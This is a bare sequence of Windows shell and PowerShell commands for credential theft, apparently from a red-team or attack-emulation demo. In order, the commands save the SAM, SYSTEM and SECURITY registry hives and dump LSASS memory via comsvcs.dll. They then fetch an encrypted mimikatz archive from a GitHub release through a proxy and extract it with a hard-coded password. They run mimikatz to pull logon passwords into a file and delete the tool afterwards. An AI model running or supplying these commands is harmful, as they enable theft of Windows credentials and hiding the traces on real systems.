cmd.exe /c "reg.exe save hklm\security %TEMP%\SECURITY.dmp & reg.exe save hklm\system %TEMP%\SYSTEM.dmp & reg.exe save hklm\sam %TEMP%\SAM.dmp"
C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass.dmp full
$tkn= Get-Content "C:\CRDemo\tkn.txt"; $headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}; Invoke-WebRequest "https://api.github.com/repos/tameval/poc124509/releases/assets/81648140" -Proxy "http://13.231.199.128:3128" -Headers $headers -OutFile $env:TEMP\enc_mimikatz.zip
cmd.exe /c '"C:\Program Files\7-Zip\7z.exe" e -ppassword123 -o%TEMP% %TEMP%\enc_mimikatz.zip'
Remove-Item $env:TEMP\enc_mimikatz.zip
cd $env:TEMP
.\mimikatz.exe "sekurlsa::minidump %TEMP%\lsass.dmp" "sekurlsa::logonpasswords" "exit" | Out-File ($Env:TEMP + "\mimihash.txt")
Remove-Item $env:TEMP\mimikatz.exe
